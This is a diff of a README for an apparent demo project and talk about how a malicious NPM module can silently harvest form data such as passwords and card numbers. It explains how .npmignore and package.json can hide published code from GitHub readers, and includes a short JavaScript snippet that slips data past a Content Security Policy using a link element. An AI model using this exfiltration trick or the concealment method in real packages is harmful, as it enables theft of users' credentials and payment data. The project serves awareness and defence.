@@ -2,11 +2,11 @@ If you're like me, you have grown to love how productive you can be using NPM. T
 
 The following project aims to show the dangers of blindly importing NPM modules. It shows how just because you can see the code on Github does not mean the module you are importing is safe. It also demonstrates how all it takes is one disgruntled employee to start harvesting user's data, both silently and indefinitely. It shows just how hard it is to sniff out such an attack by utilizing some clever tricks. Finally, it aims to show how as our javascript project's dependencies grow, our risk of being affected by such an attack increases dramatically.
 
-##### Credit
+### Credit
 
 This entire project is based off [this Medium Post](https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5). Credit to it's author, David Gilbertson, for all the ideas and even some of the code.
 
-##### What all is here?
+### What all is here?
 
 1. A basic React app with some form inputs that we will harvest
     * Created with create-react-app
@@ -16,7 +16,7 @@ This entire project is based off [this Medium Post](https://hackernoon.com/im-ha
 3. An api to receive the form data
     * Express server
 
-##### Running the React Application
+### Running the React Application
 
 ```javascript
 # within demo dir
@@ -24,7 +24,7 @@ This entire project is based off [this Medium Post](https://hackernoon.com/im-ha
 > yarn start
 ```
 
-##### Running the API
+### Running the API
 
 ```javascript
 # within demo dir
@@ -32,7 +32,7 @@ This entire project is based off [this Medium Post](https://hackernoon.com/im-ha
 > node ./api
 ```
 
-##### How does the attack work?
+### How does the attack work?
 
 1. User creates seemingly useful node_module
 2. When imported, our node_module applies exploit to all forms on the site/application
@@ -45,7 +45,7 @@ This entire project is based off [this Medium Post](https://hackernoon.com/im-ha
 using .gitignore, .npmignore, and the files configuration option in our package.json, we can have different code in NPM than what shows in Github. So you really have no clue what code you are running from NPM, even if you have complete access to the github source. The only way to check this would be to check the 3 config files from the first sentence of this section. I bet you don't do that every time you install an NPM module, do you?
 
 
-##### Content Security Policy
+### Content Security Policy
 This is supposed to be our saving grace, right? Wrong. In Chrome, we can bypass the content security policy using the following code
 ```javascript
 const linkEl = document.createElement('link');
@@ -54,13 +54,13 @@ linkEl.href = urlWithYourPreciousData;
 document.head.appendChild(linkEl);
 ```
 
-##### Why is NPM the distribution method?
+### Why is NPM the distribution method?
 When we add a dependency to our project, NPM will automatically pull in all of this new dependency's dependencies. This means that if one popular package gets infected, it will likely spread to hundreds or thousands of smaller packages. An infected top level package would be bad news for everyone. Remember left_pad?
 
-##### So what... I can never use NPM modules?
+### So what... I can never use NPM modules?
 Well that certainly is one option... If you truly want to ensure that you will never fall victim to this attack, you must isolate any pages with sensitive form data outside of the scope of the NPM modules. Example, for a login or checkout screen, you may want to embed an isolated page within an iFrame. This way no offending code will be able to attack the content with the iFrame. As a simple solution, one could stick to some good old fashion HTML.
 
-##### Presenting this content
+### Presenting this content
 I created this project for a couple of reasons, namely, to recreate what David Gilbertson has described in his blog post. I ended up having a ton of fun setting this up, and wanted to turn it into a short talk - not unlike those you may find at a developers conference. 
 
 Without further ado, here's the order I settled on when presenting:
@@ -91,7 +91,7 @@ Without further ado, here's the order I settled on when presenting:
 9) Questions/Comments
 
 
-##### Possible Improvements
+### Possible Improvements
 * Failed api requests should fail silently
 * Make the Content-Security-Policy configurable on both ends
 * This demo got more involved than I was anticipating, proper tests around the exploit would be nice.
